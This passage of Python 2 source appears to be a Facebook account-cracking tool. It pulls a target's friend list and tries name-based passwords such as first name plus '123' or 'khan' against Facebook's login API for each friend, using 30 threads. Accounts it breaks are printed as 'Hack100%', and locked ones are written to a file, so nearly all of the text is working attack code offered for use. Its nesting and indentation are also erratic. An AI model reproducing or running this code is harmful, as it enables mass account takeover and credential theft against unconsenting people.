					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										

					       q = json.load(data)										

					       if 'access_token' in q:	

						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                       z = json.loads(x.text)

						       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'								

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									

						       oks.append(user+pass3)

                                               else:

			                               if 'www.facebook.com' in q["error_msg"]:

				                           print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'

				                           cek = open("out/super_cp.txt", "a")

				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")

				                           cek.close()

				                           cekpoint.append(user+pass3)									

					               else:										

						           pass4 = ('justin' + b['last_name'])									

			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                   q = json.load(data)												

			                                   if 'access_token' in q:		

						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                   z = json.loads(x.text)

				                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											

				                                   oks.append(user+pass4)

                                                           else:

			                                           if 'www.facebook.com' in q["error_msg"]:

				                                       print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'

				                                       cek = open("out/super_cp.txt", "a")

				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")

				                                       cek.close()

				                                       cekpoint.append(user+pass4)					

					                           else:									

						                       pass5 = ('jack' + b['last_name'])						

						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								

						                       q = json.load(data)								

						                       if 'access_token' in q:	

						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                               z = json.loads(x.text)

						                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'						

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							

						                               oks.append(user+pass5)	

                                                                       else:

			                                                       if 'www.facebook.com' in q["error_msg"]:

				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'

				                                                   cek = open("out/super_cp.txt", "a")

				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")

				                                                   cek.close()

				                                                   cekpoint.append(user+pass5)					

						                               else:								

							                           pass6 = ('mark' + b['last_name'])											

			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                                           q = json.load(data)												

			                                                           if 'access_token' in q:	

								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                           z = json.loads(x.text)

				                                                           print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											

				                                                           oks.append(user+pass6)

                                                                                   else:

			                                                                   if 'www.facebook.com' in q["error_msg"]:

				                                                               print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'

				                                                               cek = open("out/super_cp.txt", "a")

				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")

				                                                               cek.close()

				                                                               cekpoint.append(user+pass6)	

						                                           else:							

								                               pass7 = b['first_name']+'Michael'						

								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						

								                               q = json.load(data)						

								                               if 'access_token' in q:		

				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                       z = json.loads(x.text)

									                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'					

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					

									                               oks.append(user+pass7)

                                                                                               else:

			                                                                               if 'www.facebook.com' in q["error_msg"]:

				                                                                           print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'

				                                                                           cek = open("out/super_cp.txt", "a")

				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")

				                                                                           cek.close()

				                                                                           cekpoint.append(user+pass7)           					

								                                       else:						

										                           pass8 = ('Daniel' + b['last_name'])										

			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                                                                   q = json.load(data)												

			                                                                                   if 'access_token' in q:		

										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                                   z = json.loads(x.text)

				                                                                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											

				                                                                                   oks.append(user+pass8)

                                                                                                           else:

			                                                                                           if 'www.facebook.com' in q["error_msg"]:

				                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'

				                                                                                       cek = open("out/super_cp.txt", "a")

				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")

				                                                                                       cek.close()

				                                                                                       cekpoint.append(user+pass8)   	

										                                   else:					

										                                       pass9 = b['first_name'] + '1122'					

										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				

										                                       q = json.load(data)				

										                                       if 'access_token' in q:		

		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                                               z = json.loads(x.text)

											                                       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'			

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	

											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			

											                                       oks.append(user+pass9)

                                                                                                                       else:

			                                                                                                       if 'www.facebook.com' in q["error_msg"]:

				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'

				                                                                                                   cek = open("out/super_cp.txt", "a")

				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")

				                                                                                                   cek.close()

				                                                                                                   cekpoint.append(user+pass9)		

											                                       

																	

															

		except:

			pass

		

	p = ThreadPool(30)

	p.map(main, id)

	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mNOOR AFRIDI\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

	print "  \033[1;91m«---•◈•---By MR NA--•◈•---»" #Dev:Mr a7a

	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'

	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))

	print """

____/\\\\\\\\\______/\\\\\\\\\\\__/\\\\\\\\\\\\________/\\\\\\\\\____        

 __/\\\///////\\\___\/////\\\///__\/\\\////////\\\____/\\\\\\\\\\\\\__       

  _\/\\\_____\/\\\_______\/\\\_____\/\\\______\//\\\__/\\\/////////\\\_      

   _\/\\\\\\\\\\\/________\/\\\_____\/\\\_______\/\\\_\/\\\_______\/\\\_     

    _\/\\\//////\\\________\/\\\_____\/\\\_______\/\\\_\/\\\\\\\\\\\\\\\_    

     _\/\\\____\//\\\_______\/\\\_____\/\\\_______\/\\\_\/\\\/////////\\\_   

      _\/\\\_____\//\\\______\/\\\_____\/\\\_______/\\\__\/\\\_______\/\\\_  

       _\/\\\______\//\\\__/\\\\\\\\\\\_\/\\\\\\\\\\\\/___\/\\\_______\/\\\_ 

        _\///________\///__\///////////__\////////////_____\///________\///__

         Checkpoint ID Open After 7 Days

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.

: \033[1;91m ....MR  NA....... \033[1;95m :

•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 

                

              \033[1;91m +xxxxxxxxxxxx"""

	

	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")

	menu()

         

def mafia():

	global toket

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		print"\x1b[1;94mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	os.system('clear')

	print logo

	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;95mClone Friend List Public ID."

        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;95mTelegram me @Hacker_Afridi."

        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;95mTelegram Chenal @HACKING_MASTER."

	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"

	pilih_mafia()

def pilih_mafia():

	peak = raw_input("\n\033[1;95mChoose an Option>>> \033[1;97m")

	if peak =="":

		print "\x1b[1;94mFill in correctly"

		pilih_mafia()

	elif peak =="1":

		os.system('clear')

		print logo

		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")

		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mNOOR AFRIDI\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

		try:

			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)

			op = json.loads(jok.text)

			print"\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]

		except KeyError:

			print"\x1b[1;97mID Not Found!"

			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")

			mafia()

		print"\033[1;94mGetting IDs\033[1;97m..."

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)

		z = json.loads(r.text)

		for i in z['data']:

			id.append(i['id'])

        elif peak =="2":

	        os.system('xdg-open https://chat.whatsapp.com/FEs5BfBzpNY3oMSgDx')

	        menu()

        elif peak =="3":

	        os.system('xdg-open https://youtube.com/@Dr_Noor_Afridi')

	        menu()

	elif peak =="0":

		menu()

	else:

		print "\x1b[1;97mFill in correctly"

		pilih_mafia()

	

	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))

	jalan('\033[1;94mPlease Wait\033[1;94m...')

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\033[1;94mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

	print "\n\033[1;97m«--•◈••◈•---\x1b[1;94m•◈•Stop Process Press CTRL+Z•◈•\033[1;97m---•◈••◈•-»"

	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mNOOR AFRIDI\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"

	jalan(' \033[1;97m.................\033[1;94mCloning Start..\033[1;97m............ ')

	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mNOOR AFRIDI\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"

	

			

	def main(arg):

		global cekpoint,oks

		user = arg

		try:

			os.mkdir('out')

		except OSError:

			pass #Dev:love_hacker

		try:													

			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												

			b = json.loads(a.text)												

			pass1 = b['first_name'] + '123'												

			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			q = json.load(data)												

			if 'access_token' in q:

				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				z = json.loads(x.text)

				print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											

				oks.append(user+pass1)

                        else:

			        if 'www.facebook.com' in q["error_msg"]:

				    print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'

				    cek = open("out/super_cp.txt", "a")

				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")

				    cek.close()

				    cekpoint.append(user+pass1)

                                else:

				    pass2 = b['last_name'] + '123'										

                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			            q = json.load(data)												

			            if 'access_token' in q:	

				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				            z = json.loads(x.text)

				            print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											

				            oks.append(user+pass2)

                                    else:

			                   if 'www.facebook.com' in q["error_msg"]:

				               print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'

				               cek = open("out/super_cp.txt", "a")

				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")

				               cek.close()

				               cekpoint.append(user+pass2)								

				           else:											

					       pass3 = (b['first_name']+'1234')								

					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										

					       q = json.load(data)										

					       if 'access_token' in q:	

						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                       z = json.loads(x.text)

						       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'								

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									

						       oks.append(user+pass3)

                                               else:

			                               if 'www.facebook.com' in q["error_msg"]:

				                           print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'

				                           cek = open("out/super_cp.txt", "a")

				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")

				                           cek.close()

				                           cekpoint.append(user+pass3)									

					               else:										

						           pass4 = ('Md' + b['last_name'])											

			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                   q = json.load(data)												

			                                   if 'access_token' in q:		

						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                   z = json.loads(x.text)

				                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											

				                                   oks.append(user+pass4)

                                                           else:

			                                           if 'www.facebook.com' in q["error_msg"]:

				                                       print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'

				                                       cek = open("out/super_cp.txt", "a")

				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")

				                                       cek.close()

				                                       cekpoint.append(user+pass4)					

					                           else:									

						                       pass5 = (b['first_name'] + b['last_name'])						

						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								

						                       q = json.load(data)								

						                       if 'access_token' in q:	

						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                               z = json.loads(x.text)

						                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'						

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							

						                               oks.append(user+pass5)	

                                                                       else:

			                                                       if 'www.facebook.com' in q["error_msg"]:

				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'

				                                                   cek = open("out/super_cp.txt", "a")

				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")

				                                                   cek.close()

				                                                   cekpoint.append(user+pass5)					

						                               else:								

							                           pass6 = (b['first_name']+'1122')										

			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                                           q = json.load(data)												

			                                                           if 'access_token' in q:	

								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                           z = json.loads(x.text)

				                                                           print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											

				                                                           oks.append(user+pass6)

                                                                                   else:

			                                                                   if 'www.facebook.com' in q["error_msg"]:

				                                                               print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'

				                                                               cek = open("out/super_cp.txt", "a")

				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")

				                                                               cek.close()

				                                                               cekpoint.append(user+pass6)	

						                                           else:							

								                               pass7 = (b['first_name']+'khan')					

								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						

								                               q = json.load(data)						

								                               if 'access_token' in q:		

				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                       z = json.loads(x.text)

									                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'					

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					

									                               oks.append(user+pass7)

                                                                                               else:

			                                                                               if 'www.facebook.com' in q["error_msg"]:

				                                                                           print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'

				                                                                           cek = open("out/super_cp.txt", "a")

				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")

				                                                                           cek.close()

				                                                                           cekpoint.append(user+pass7)           					

								                                       else:						

